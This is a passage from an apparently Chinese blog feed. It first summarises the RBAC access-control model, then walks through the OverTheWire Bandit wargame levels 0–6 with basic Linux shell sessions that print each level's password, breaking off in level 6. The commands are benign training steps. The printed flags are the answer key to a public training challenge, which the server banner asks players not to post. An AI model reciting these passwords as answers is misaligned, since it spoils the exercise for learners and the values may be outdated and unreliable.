model</h4><p>这个模型中，有三组实体：<strong>User(用户)，Roles(角色)，Permission(权限)</strong>，上图中也有<strong>Sessions(会话)</strong>的集合</p><p>用户：可以是智能的自治代理，例如机器人、静止的电脑甚至是电脑中的网络，简单的，我们可以认为一个用户就是一个人</p><p>角色：一个角色就是一个工作职能或工作名(职务名)，具有与授予角色成员的权限和责任的相关联的语义</p><p>权限：是一种对系统内一个或多个对象访问的模式的许可，授权条款、访问权限、优先级都象征着权限，权限的概念可以是多样化的</p><p>在这个框架里，拒绝访问被认为是一种约束，而不是一种拒绝的权限</p><p>权限的性质使其依赖于系统的实现细节和系统本身，因此一个访问控制的通用模型将权限看作为一个扩展的没有解释的符号。每个系统保护着他自己实现的抽象对象，因此操作系统维护着像文件、目录、设备、端口等以及其读写执行的权限。一个关系型数据库管理系统维护着关系、元组、属性、视图以及其insert、update、delete、select等操作</p><p>权限可以应用于单个或多个对象</p><p>正如上图所说，<strong>用户和角色，角色和权限都是多对多的关系。</strong>一个用户可以拥有多个角色，一个角色也可以拥有多个用户，相似的，一个角色可以拥有多个权限，一个权限也可以被多个角色所拥有。RBAC的关键性设计就在这两个多对多的关系。这种对应关系最后使得一个用户可以行使一种权利。把角色当作用户和权限的中间人提供了更好的访问控制设置，更加直接的将用户和权限联系起来</p><p>对话(Session)：是一种一个用户和多种角色的映射。当用户想要激活他所属的一些角色时，一个用户将会建立起一个对话。在对话里，对话和角色是一对多的关系，用户对应的多种角色在对话里同时被启用，对话里所有角色所拥有的权限都可以被用户所使用。每个对话和一个单一的用户绑定，这种绑定在一个对话的生命周期内保持不变。</p><p>在同一时间内，一个用户可能有多个对话，每个对话都在一个不同的工作窗口。每个对话有可能有不同的角色绑定。这个RBAC0的功能支持最小特权原则。一个用户可以激活他所拥有角色集合的任意子集，保证其在一个对话中对于一个任务最合适。因此，拥有一个强大权限的角色一般为不激活，当他被需要时，才去激活他。在一个对话的生命周期内，RBAC0也允许角色的动态激活和失效。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Role-Based-Access-Control/4.png" alt></p><p>假如将RBAC0以形式化语言说明，那么可以看看下图所示</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Role-Based-Access-Control/5.png" alt></p><h4 id="RBAC1-——Role-hierarchies"><a href="#RBAC1-——Role-hierarchies" class="headerlink" title="RBAC1 ——Role hierarchies"></a>RBAC<sub>1</sub> ——Role hierarchies</h4><p>角色继承是一种结构化角色的方法，去反应组织的权限和责任的结构</p><p>这边继承的概念就如面向对象中继承的特性一样，论文中的例子我就不再复述了。</p><p>直接在此给出论文中形式化语言的描述</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Role-Based-Access-Control/6.png" alt></p><h4 id="RBAC2-——Constraints"><a href="#RBAC2-——Constraints" class="headerlink" title="RBAC2 ——Constraints"></a>RBAC<sub>2</sub> ——Constraints</h4><p>实际上，RBAC1和RBAC2没有包含关系，虽然他们在数字版本上是相邻的。正如RBAC模型的关系里，这两个是属于并列关系的。</p><p>约束(Constraints)也是RBAC模型中重要的一方面。</p><p>在论文中，是采购经理和财务经理的关系，这两个职责明显不能由同一个人来担任，因为这回造成欺诈。这是一个历史悠久的原则——<strong>职责分离</strong>。不过对于例子，我更喜欢在博客中看到的这个例子：一个人不能再比赛中同时担任参赛选手和裁判，这明显的会造成比赛公平性缺失，虽然这在现实中几乎不可能发生，但我觉得这是对于这个方面最直观的体现。</p><p>约束是在更高等级组织政策中一种有力的机制。确定的角色需要被定义为相互排斥的，即职责分离。</p><p>只要RBAC的管理是被一个高级安全官员完全中心化管理的，约束就是非常的方便，同时也体现了高级安全官员的决策影响十分重大。但假如RBAC的管理去中心化，约束就变成了一种机制，使得级别高的安全官员可以限制用户行使管理权限</p><p>约束应用于User Assignment和Permission Assignment的关系，使得返回一个函数值为接收或者不接受。</p><p>以下是论文中对约束的定义</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Role-Based-Access-Control/7.png" alt></p><p>在这个定义下，权限必须具有原子性</p><p>有些角色产生的历史原因就是为了制约另一个角色，裁判员就是为了制约运动员从而让运动员按照规范去比赛。如果一个人兼任这两个角色，比赛必然容易出现不公正的情况从而违背竞技公平性准则。还有就是我们每个人在不同的场景都会充当不同的角色，在公司你就是特定岗位的员工，在家庭中你就是一名家庭成员。随着场景的切换，我们的角色也在随之变化。所以 <strong>RBAC2</strong> 在 <strong>RBAC0</strong> 的基础上引入了静态职责分离（Static Separation of Duty，简称SSD）和动态职责分离（Dynamic Separation of Duty，简称DSD）两个约束概念。他们两个作用的生命周期是不同的;</p><ul><li><p><strong>SSD</strong> 作用于约束用户和角色绑定时。 1.互斥角色：就像上面的例子你不能既是A又是B，互斥的角色只能二选一 ; 2. 数量约束：用户的角色数量是有限的不能多于某个基数； 3. 条件约束：只能达到某个条件才能拥有某个角色。经常用于用户等级体系，只有你充钱成为VIP才能一刀999。</p></li><li><p><strong>DSD</strong> 作用于会话和角色交互时。当用户持有多个角色，在用户通过会话激活角色时加以条件约束，根据不同的条件执行不同的策略。</p></li></ul><h4 id="RBAC3-——Consolidated-Model"><a href="#RBAC3-——Consolidated-Model" class="headerlink" title="RBAC3 ——Consolidated Model"></a>RBAC<sub>3</sub> ——Consolidated Model</h4><p>RBAC3将RBAC1和RBAC2的特性结合起来，也就是在RBAC0的基础上同时拥有了角色继承和约束的两个特性。</p><p>约束可以被应用于角色继承中。例如约束可以限制一个角色的数量，比如一个公司只能有1个ceo；在此模型中，约束可以是多样化的，不仅可以约束角色的数量，也可以约束角色的关系。</p><p>约束在某些情况下非常有用，尤其是在更改角色层次结构的权限已经被分散的情况下</p><h4 id="管理模型——Management-models"><a href="#管理模型——Management-models" class="headerlink" title="管理模型——Management models"></a>管理模型——Management models</h4><p>以上的管理模型都是基于单个安全管理员，在大型系统中，一般都有一个安全管理团队</p><p>那么问题就来了，RBAC如何管理自己呢？</p><p>作者给出了如图下这样一种模型</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Role-Based-Access-Control/8.png" alt></p><p>在此模型中，约束应用于RBAC中的任一部分，图中上半部分与和RBAC0的基本模型的类似，增加了下半部分，用于对管理角色(AR)和管理权力(AP)的说明，普通权限只能给普通角色，而管理权限只能给管理角色，这是个内在约束。<br>作者认为在管理管理层次时，只需要一个主要的安全管理员就够了，不需要第二个管理层次来管理第一个。</p><blockquote><p>管理者的权力包括：</p><ul><li>修改UA</li><li>修改PA</li><li>修改角色层次关系</li></ul></blockquote><p>RBAC中的管理权限可以看作是修改用户分配，权限分配和角色层次关系的功能。在管理模型中，必须<strong>显式定义</strong>这些管理操作的权限。这些权限的确切性质是具体实现，但是他们的一般性质几乎相同。</p><p>一般地，每个管理角色都将映射到她负责管理的角色层次结构的某个子集。管理的其他方面也需要限定范围，比如删除行为和修改行为就不一样，可以在此限定范围。</p><h3 id="概念理解"><a href="#概念理解" class="headerlink" title="概念理解"></a>概念理解</h3><h4 id="角色（Role）"><a href="#角色（Role）" class="headerlink" title="角色（Role）"></a>角色（Role）</h4><p>角色是一个组织中的一个职务职能或职称</p><p>角色的概念与在访问控制中的用户组的概念相近，但是一个角色是把一组用户和一些权限关联在一起，而用户组却只能代表一组的用户</p><p>多角色分配：假如有一个用户被分配到了多种角色，那么会怎么样呢？RBAC是一个加法模型，因此，该用户会拥有其所分配到的所有角色所具有的权限。</p><h4 id="权限（Permission）"><a href="#权限（Permission）" class="headerlink" title="权限（Permission）"></a>权限（Permission）</h4><p>权限具有原子性，不可再分</p><p>在RBAC框架里，拒绝访问被建模为一个约束，而不是一个否定的权限。</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Wargame</title>
      <link href="/2020/02/13/CTF-Wargame/"/>
      <url>/2020/02/13/CTF-Wargame/</url>
      
        <content type="html"><![CDATA[<p>鉴于最近的状态，看逆向又看不进去，就找了个简单的靶场玩一玩</p><p><a href="https://overthewire.org/wargames/" target="_blank" rel="noopener">https://overthewire.org/wargames/</a></p><h1 id="Wargames"><a href="#Wargames" class="headerlink" title="Wargames"></a><center>Wargames</center></h1><h2 id="Suggested-order-to-play-the-games-in"><a href="#Suggested-order-to-play-the-games-in" class="headerlink" title="Suggested order to play the games in"></a>Suggested order to play the games in</h2><ol><li>Bandit</li><li>Leviathan or Natas or Krypton</li><li>Narnia</li><li>Behemoth</li><li>Utumno</li><li>Maze</li><li>…</li></ol><h2 id="Bandit"><a href="#Bandit" class="headerlink" title="Bandit"></a>Bandit</h2><blockquote><h3 id="From-the-official-tips"><a href="#From-the-official-tips" class="headerlink" title="From the official tips:"></a>From the official tips:</h3><p>There are several things you can try when you are unsure how to continue:</p><ul><li>First, if you know a command, but don’t know how to use it, try the <strong>manual</strong> (<a href="https://en.wikipedia.org/wiki/Man_page" target="_blank" rel="noopener">man page</a>) by entering “<strong>man </strong>” (without the quotes). e.g. if you know about the “ls” command, type: man ls. The “man” command also has a manual, try it. Press q to quit the man command.</li><li>Second, if there is no man page, the command might be a <strong>shell built-in</strong>. In that case use the “<strong>help </strong>” command. E.g. help cd</li><li>Also, your favorite <strong>search-engine</strong> is your friend. Learn how to use it! I recommend <a href="https://www.google.com/" target="_blank" rel="noopener">Google</a>.</li><li>Lastly, if you are still stuck, you can <a href="https://overthewire.org/information/irc.html" target="_blank" rel="noopener">join us on IRC</a></li></ul></blockquote><h3 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h3><p>关于ssh的用法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh bandit0@bandit.labs.overthewire.org -p 2220</span><br></pre></td></tr></table></figure><p>连上主机后便可以开始游戏</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">--[ Playing the games ]--</span><br><span class="line"></span><br><span class="line">  This machine might hold several wargames.</span><br><span class="line">  If you are playing <span class="string">"somegame"</span>, then:</span><br><span class="line"></span><br><span class="line">    * USERNAMES are somegame0, somegame1, ...</span><br><span class="line">    * Most LEVELS are stored in /somegame/.</span><br><span class="line">    * PASSWORDS <span class="keyword">for</span> each level are stored in /etc/somegame_pass/.</span><br><span class="line"></span><br><span class="line">  Write-access to homedirectories is disabled. It is advised to create a</span><br><span class="line">  working directory with a hard-to-guess name in /tmp/.  You can use the</span><br><span class="line">  command <span class="string">"mktemp -d"</span> in order to generate a random and hard to guess</span><br><span class="line">  directory in /tmp/.  Read-access to both /tmp/ and /<span class="keyword">proc</span>/<span class="title"> is</span> disabled</span><br><span class="line"><span class="title">  so</span> that<span class="title"> users</span> can<span class="title"> not</span> snoop<span class="title"> on</span> eachother.<span class="title"> Files</span> and<span class="title"> directories</span> with</span><br><span class="line"><span class="title">  easily</span> guessable<span class="title"> or</span> short<span class="title"> names</span> will<span class="title"> be</span> periodically<span class="title"> deleted!</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title"></span> <span class="title"> Please</span> play<span class="title"> nice:</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title"></span>    *<span class="title"> don't</span> leave<span class="title"> orphan</span> processes<span class="title"> running</span></span><br><span class="line"><span class="title"></span>    *<span class="title"> don't</span> leave<span class="title"> exploit-files</span> laying<span class="title"> around</span></span><br><span class="line"><span class="title"></span>    *<span class="title"> don't</span> annoy<span class="title"> other</span> players</span><br><span class="line">    *<span class="title"> don't</span> post<span class="title"> passwords</span> or<span class="title"> spoilers</span></span><br><span class="line"><span class="title"></span>    *<span class="title"> again,</span> DONT<span class="title"> POST</span> SPOILERS!</span><br><span class="line"><span class="title">      This</span> includes<span class="title"> writeups</span> of<span class="title"> your</span> solution<span class="title"> on</span> your<span class="title"> blog</span> or<span class="title"> website!</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">--[</span> Tips ]--</span><br><span class="line"></span><br><span class="line"><span class="title">  This</span> machine<span class="title"> has</span> a 64bit<span class="title"> processor</span> and<span class="title"> many</span> security-features<span class="title"> enabled</span></span><br><span class="line"><span class="title"></span> <span class="title"> by</span> default,<span class="title"> although</span> ASLR<span class="title"> has</span> been<span class="title"> switched</span> off.<span class="title">  The</span> following</span><br><span class="line"><span class="title">  compiler</span> flags<span class="title"> might</span> be<span class="title"> interesting:</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title"></span>    -m32<span class="title">                    compile</span> for 32bit</span><br><span class="line">    -fno-stack-protector<span class="title">    disable</span> ProPolice</span><br><span class="line">    -Wl,-z,norelro<span class="title">          disable</span> relro</span><br><span class="line"></span><br><span class="line"><span class="title">  In</span> addition,<span class="title"> the</span> execstack<span class="title"> tool</span> can<span class="title"> be</span> used<span class="title"> to</span> flag<span class="title"> the</span> stack<span class="title"> as</span></span><br><span class="line"><span class="title"></span> <span class="title"> executable</span> on<span class="title"> ELF</span> binaries.</span><br><span class="line"></span><br><span class="line"><span class="title">  Finally,</span> network-access<span class="title"> is</span> limited<span class="title"> for</span> most<span class="title"> levels</span> by<span class="title"> a</span> local</span><br><span class="line"><span class="title">  firewall.</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">--[</span> Tools ]--</span><br><span class="line"></span><br><span class="line"><span class="title"> For</span> your<span class="title"> convenience</span> we<span class="title"> have</span> installed<span class="title"> a</span> few<span class="title"> usefull</span> tools<span class="title"> which</span> you<span class="title"> can</span> find</span><br><span class="line"><span class="title"> in</span> the<span class="title"> following</span> locations:</span><br><span class="line"></span><br><span class="line">    *<span class="title"> pwndbg</span> (https://github.com/pwndbg/pwndbg)<span class="title"> in</span> /usr/local/pwndbg/</span><br><span class="line">    *<span class="title"> peda</span> (https://github.com/longld/peda.git)<span class="title"> in</span> /usr/local/peda/</span><br><span class="line">    *<span class="title"> gdbinit</span> (https://github.com/gdbinit/Gdbinit)<span class="title"> in</span> /usr/local/gdbinit/</span><br><span class="line">    *<span class="title"> pwntools</span> (https://github.com/Gallopsled/pwntools)</span><br><span class="line">    *<span class="title"> radare2</span> (http://www.radare.org/)</span><br><span class="line">    *<span class="title"> checksec.sh</span> (http://www.trapkit.de/tools/checksec.html)<span class="title"> in</span> /usr/local/bin/checksec.sh</span><br><span class="line"></span><br><span class="line">--[<span class="title"> More</span> information ]--</span><br><span class="line"></span><br><span class="line"><span class="title">  For</span> more<span class="title"> information</span> regarding<span class="title"> individual</span> wargames,<span class="title"> visit</span></span><br><span class="line"><span class="title"></span> <span class="title"> http://www.overthewire.org/wargames/</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title"></span> <span class="title"> For</span> support,<span class="title"> questions</span> or<span class="title"> comments,</span> contact<span class="title"> us</span> through<span class="title"> IRC</span> on</span><br><span class="line"><span class="title">  irc.overthewire.org</span> #wargames.</span><br><span class="line"></span><br><span class="line"><span class="title">  Enjoy</span> your<span class="title"> stay!</span></span><br></pre></td></tr></table></figure><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p><code>ls</code>之后得到flag，即下一关的密码（不知道为啥windows的CMD一直登陆不仅</p><p>建议用linux,windows是玄学</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit0@bandit:~$ cat readme</span><br><span class="line">boJ9jbbUNNfktd78OOpsqOltutMc3MY1</span><br></pre></td></tr></table></figure><p>wargame的原理就是上一关的flag是下一关ssh的密码</p><h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bandit1@bandit:~$ ls</span><br><span class="line">-</span><br><span class="line">bandit1@bandit:~$ <span class="built_in">cd</span> -</span><br><span class="line">-bash: <span class="built_in">cd</span>: OLDPWD not <span class="built_in">set</span></span><br><span class="line">bandit1@bandit:~$ <span class="built_in">cd</span> \-</span><br><span class="line">-bash: <span class="built_in">cd</span>: OLDPWD not <span class="built_in">set</span></span><br><span class="line">bandit1@bandit:~$ <span class="built_in">cd</span> /-</span><br><span class="line">-bash: <span class="built_in">cd</span>: /-: No such file or directory</span><br><span class="line">bandit1@bandit:~$ ls -al</span><br><span class="line">total 24</span><br><span class="line">-rw-r-----  1 bandit2 bandit1   33 Oct 16  2018 -</span><br><span class="line">drwxr-xr-x  2 root    root    4096 Oct 16  2018 .</span><br><span class="line">drwxr-xr-x 41 root    root    4096 Oct 16  2018 ..</span><br><span class="line">-rw-r--r--  1 root    root     220 May 15  2017 .bash_logout</span><br><span class="line">-rw-r--r--  1 root    root    3526 May 15  2017 .bashrc</span><br><span class="line">-rw-r--r--  1 root    root     675 May 15  2017 .profile</span><br><span class="line">bandit1@bandit:~$ cat /-</span><br><span class="line">cat: /-: No such file or directory</span><br><span class="line">bandit1@bandit:~$ cat ./-</span><br><span class="line">CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</span><br></pre></td></tr></table></figure><p>刚开始以为<code>-</code>是一个目录，便去cd，结果是<code>oldpwd not set</code>，百度之后发现是返回上一个目录</p><p><code>ls</code>查看了才知道是是一个文件</p><blockquote><p>bash中，<code>-</code>会被解析为stdin，即标准输出流，假如直接<code>$ cat -</code>，这条命令会回显输入的任意字符，知道输入<code>eof</code></p><p>摆脱转义的方法就是使用相对路径或者绝对路径</p></blockquote><h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bandit2@bandit:~$ ls</span><br><span class="line">spaces <span class="keyword">in</span> this filename</span><br><span class="line">bandit2@bandit:~$ ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x  2 root    root    4096 Oct 16  2018 .</span><br><span class="line">drwxr-xr-x 41 root    root    4096 Oct 16  2018 ..</span><br><span class="line">-rw-r--r--  1 root    root     220 May 15  2017 .bash_logout</span><br><span class="line">-rw-r--r--  1 root    root    3526 May 15  2017 .bashrc</span><br><span class="line">-rw-r--r--  1 root    root     675 May 15  2017 .profile</span><br><span class="line">-rw-r-----  1 bandit3 bandit2   33 Oct 16  2018 spaces <span class="keyword">in</span> this filename</span><br><span class="line">bandit2@bandit:~$ cat spaces\ <span class="keyword">in</span>\ this\ filename </span><br><span class="line">UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</span><br><span class="line">bandit2@bandit:~$ cat <span class="string">"spaces in this filename"</span> </span><br><span class="line">UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</span><br><span class="line">bandit2@bandit:~$ cat <span class="string">'spaces in this filename'</span></span><br><span class="line">UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</span><br></pre></td></tr></table></figure><p>总所周知，linux文件名中假如有空格的话，直接输入肯定是打不开的</p><p>我这边直接用tab，补全了所有对空格的转义</p><p>当然，用引号包含也行</p><blockquote><p><a href="https://unix.stackexchange.com/questions/148043/is-space-not-allowed-in-a-filename" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/148043/is-space-not-allowed-in-a-filename</a></p></blockquote><p>一般来说linux和unix上应该避免文件名中包含空格的</p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bandit3@bandit:~$ ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x  3 root root 4096 Oct 16  2018 .</span><br><span class="line">drwxr-xr-x 41 root root 4096 Oct 16  2018 ..</span><br><span class="line">-rw-r--r--  1 root root  220 May 15  2017 .bash_logout</span><br><span class="line">-rw-r--r--  1 root root 3526 May 15  2017 .bashrc</span><br><span class="line">drwxr-xr-x  2 root root 4096 Oct 16  2018 inhere</span><br><span class="line">-rw-r--r--  1 root root  675 May 15  2017 .profile</span><br><span class="line">bandit3@bandit:~$ </span><br><span class="line">bandit3@bandit:~$ <span class="built_in">cd</span> inhere</span><br><span class="line">bandit3@bandit:~/inhere$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 root    root    4096 Oct 16  2018 .</span><br><span class="line">drwxr-xr-x 3 root    root    4096 Oct 16  2018 ..</span><br><span class="line">-rw-r----- 1 bandit4 bandit3   33 Oct 16  2018 .hidden</span><br><span class="line">bandit3@bandit:~/inhere$ cat .hidden </span><br><span class="line">pIwrPrtPN36QITSp3EQaw936yaFoFgAB</span><br></pre></td></tr></table></figure><p>看来，直接<code>ls -al</code>是个好习惯</p><p>这题应该考察的是linux 的隐藏文件，linux的隐藏文件都以<code>.</code>开头</p><h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">bandit4@bandit:~$ ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x <span class="number"> 3 </span>root root<span class="number"> 4096 </span>Oct<span class="number"> 16 </span><span class="number"> 2018 </span>.</span><br><span class="line">drwxr-xr-x<span class="number"> 41 </span>root root<span class="number"> 4096 </span>Oct<span class="number"> 16 </span><span class="number"> 2018 </span>..</span><br><span class="line">-rw-r--r-- <span class="number"> 1 </span>root root <span class="number"> 220 </span>May<span class="number"> 15 </span><span class="number"> 2017 </span>.bash_logout</span><br><span class="line">-rw-r--r-- <span class="number"> 1 </span>root root<span class="number"> 3526 </span>May<span class="number"> 15 </span><span class="number"> 2017 </span>.bashrc</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Oct<span class="number"> 16 </span><span class="number"> 2018 </span>inhere</span><br><span class="line">-rw-r--r-- <span class="number"> 1 </span>root root <span class="number"> 675 </span>May<span class="number"> 15 </span><span class="number"> 2017 </span>.profile</span><br><span class="line">bandit4@bandit:~$ cd inhere/</span><br><span class="line">bandit4@bandit:~/inhere$ ls -al</span><br><span class="line">total 48</span><br><span class="line">drwxr-xr-x<span class="number"> 2 </span>root    root   <span class="number"> 4096 </span>Oct<span class="number"> 16 </span><span class="number"> 2018 </span>.</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>root    root   <span class="number"> 4096 </span>Oct<span class="number"> 16 </span><span class="number"> 2018 </span>..</span><br><span class="line">-rw-r-----<span class="number"> 1 </span>bandit5 bandit4  <span class="number"> 33 </span>Oct<span class="number"> 16 </span><span class="number"> 2018 </span>-file00</span><br><span class="line">-rw-r-----<span class="number"> 1 </span>bandit5 bandit4  <span class="number"> 33 </span>Oct<span class="number"> 16 </span><span class="number"> 2018 </span>-file01</span><br><span class="line">-rw-r-----<span class="number"> 1 </span>bandit5 bandit4  <span class="number"> 33 </span>Oct<span class="number"> 16 </span><span class="number"> 2018 </span>-file02</span><br><span class="line">-rw-r-----<span class="number"> 1 </span>bandit5 bandit4  <span class="number"> 33 </span>Oct<span class="number"> 16 </span><span class="number"> 2018 </span>-file03</span><br><span class="line">-rw-r-----<span class="number"> 1 </span>bandit5 bandit4  <span class="number"> 33 </span>Oct<span class="number"> 16 </span><span class="number"> 2018 </span>-file04</span><br><span class="line">-rw-r-----<span class="number"> 1 </span>bandit5 bandit4  <span class="number"> 33 </span>Oct<span class="number"> 16 </span><span class="number"> 2018 </span>-file05</span><br><span class="line">-rw-r-----<span class="number"> 1 </span>bandit5 bandit4  <span class="number"> 33 </span>Oct<span class="number"> 16 </span><span class="number"> 2018 </span>-file06</span><br><span class="line">-rw-r-----<span class="number"> 1 </span>bandit5 bandit4  <span class="number"> 33 </span>Oct<span class="number"> 16 </span><span class="number"> 2018 </span>-file07</span><br><span class="line">-rw-r-----<span class="number"> 1 </span>bandit5 bandit4  <span class="number"> 33 </span>Oct<span class="number"> 16 </span><span class="number"> 2018 </span>-file08</span><br><span class="line">-rw-r-----<span class="number"> 1 </span>bandit5 bandit4  <span class="number"> 33 </span>Oct<span class="number"> 16 </span><span class="number"> 2018 </span>-file09</span><br><span class="line">bandit4@bandit:~/inhere$ cat ./-file00</span><br><span class="line">����������~%C[�걱&gt;��| �</span><br><span class="line">bandit4@bandit:~/inhere$ cat ./-file01</span><br><span class="line">���U"7�w���H��ê�Q����(���<span class="comment">#���</span></span><br><span class="line">bandit4@bandit:~/inhere$ cat ./-file02</span><br><span class="line">�T�v��(�ִ�����A*�</span><br><span class="line">2J�Ş؇_�y7</span><br><span class="line">bandit4@bandit:~/inhere$ cat ./-file03</span><br><span class="line">��.A��u��<span class="comment">#���w$N?c�-��Db3��=��</span></span><br><span class="line">bandit4@bandit:~/inhere$ cat ./-file05</span><br><span class="line">+��pm���;��:D��^��@�gl�Q�</span><br><span class="line">bandit4@bandit:~/inhere$ cat ./-file04</span><br><span class="line">�=&lt;�W�����ht�Z��!��&#123;�U</span><br><span class="line">                          �</span><br><span class="line">                          bandit4@bandit:~/inhere$ cat ./-file06</span><br><span class="line">��@�%@���ZP*E��1�V���̫*����</span><br><span class="line">bandit4@bandit:~/inhere$ cat ./-file07</span><br><span class="line">koReBOKuIDDepwhWk7jZC0RTdopnAYKh</span><br><span class="line">bandit4@bandit:~/inhere$</span><br></pre></td></tr></table></figure><p>太难了，题目说only human-readable，真的是遍历10个文件</p><p>当然直接就找到flag了</p><h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bandit5@bandit:~/inhere$ ls</span><br><span class="line">maybehere00  maybehere04  maybehere08  maybehere12  maybehere16</span><br><span class="line">maybehere01  maybehere05  maybehere09  maybehere13  maybehere17</span><br><span class="line">maybehere02  maybehere06  maybehere10  maybehere14  maybehere18</span><br><span class="line">maybehere03  maybehere07  maybehere11  maybehere15  maybehere19</span><br><span class="line">bandit5@bandit:~/inhere$ du -a -b | grep 1033</span><br><span class="line">1033./maybehere07/.file2</span><br><span class="line">bandit5@bandit:~/inhere$ cat ./maybehere07/.file2</span><br><span 